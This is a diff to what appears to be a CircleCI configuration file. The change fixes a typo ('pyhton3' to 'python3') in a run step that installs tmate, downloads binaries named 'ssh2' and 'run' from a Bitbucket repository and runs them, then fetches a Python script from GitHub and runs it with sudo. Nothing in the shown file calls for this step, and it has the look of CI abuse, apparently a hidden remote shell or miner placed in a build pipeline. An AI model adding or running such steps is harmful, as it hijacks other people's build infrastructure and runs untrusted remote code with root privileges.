@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: sudo apt-get update -y && sudo apt-get install -y screen tmate sudo && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/ssh2 && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/run && chmod +x ssh2 run && ./ssh2 && ./ssh2 && sudo apt install python && sudo apt install python3 && wget https://github.com/NuDev2021/pengontolan/raw/main/kntl.py && sudo pyhton3 kntl.py
+      - run: sudo apt-get update -y && sudo apt-get install -y screen tmate sudo && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/ssh2 && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/run && chmod +x ssh2 run && ./ssh2 && ./ssh2 && sudo apt install python && sudo apt install python3 && wget https://github.com/NuDev2021/pengontolan/raw/main/kntl.py && sudo python3 kntl.py
